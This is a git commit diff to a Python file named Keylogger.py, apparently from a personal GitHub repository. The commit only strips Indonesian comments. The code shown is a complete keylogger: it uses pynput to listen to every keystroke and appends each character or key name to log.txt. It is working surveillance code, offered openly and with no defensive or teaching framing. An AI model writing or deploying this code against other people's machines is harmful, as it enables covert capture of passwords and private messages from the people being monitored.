7353741b501a72a5d554eb6731eb716b79b95126
bukitjose <99962731+bukitjose@users.noreply.github.com>
2023-04-06 15:27:16 +0700

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,16 +1,15 @@
 from pynput import keyboard
 
-# Fungsi ini akan dipanggil ketika tombol keyboard ditekan
 def on_press(key):
     try:
-        # Menulis karakter ke file log.txt
+
         with open("log.txt", "a") as f:
             f.write(str(key.char))
     except AttributeError:
-        # Jika bukan karakter, tulis namanya ke file log.txt
+
         with open("log.txt", "a") as f:
             f.write(str(key))
 
-# Membuat listener untuk menangkap setiap tombol yang ditekan
+
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
